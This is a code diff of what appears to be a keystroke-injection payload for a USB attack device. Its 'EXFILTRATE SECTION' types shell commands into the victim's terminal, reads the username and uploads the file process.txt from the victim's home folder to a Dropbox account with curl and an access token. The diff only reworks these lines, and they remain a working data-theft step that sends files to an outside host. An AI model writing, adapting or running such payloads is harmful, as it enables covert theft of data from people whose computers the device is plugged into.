@@ -32,19 +32,13 @@ QUACK ENTER
 QUACK DELAY 500
 
 #### EXFILTRATE SECTION ####
-QUACK STRING ACCESS_TOKEN=\"$DROPBOX_ACCESS_TOKEN\"
+QUACK STRING USER_NAME=\$(whoami)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING USER_NAME=$(whoami)
+QUACK STRING TXT_PATH=\"/home/\$USER_NAME/process.txt\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING TXT_PATH=\"/home/$USER_NAME/process.txt\"
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING DROPBOX_FOLDER=\"/$DROPBOX_FOLDER_NAME\"
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING curl -X POST $DROPBOX_API_CONST --header \"Authorization: Bearer $ACCESS_TOKEN\" --header \"Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}\" --header \"Content-Type: application/octet-stream\" --data-binary \"@$TXT_PATH\"
+QUACK STRING curl -X POST $DROPBOX_API_CONST --header \"Authorization: Bearer $DROPBOX_ACCESS_TOKEN\" --header \"Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER_NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}\" --header \"Content-Type: application/octet-stream\" --data-binary \"@\$TXT_PATH\"
 QUACK ENTER
 
 # It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
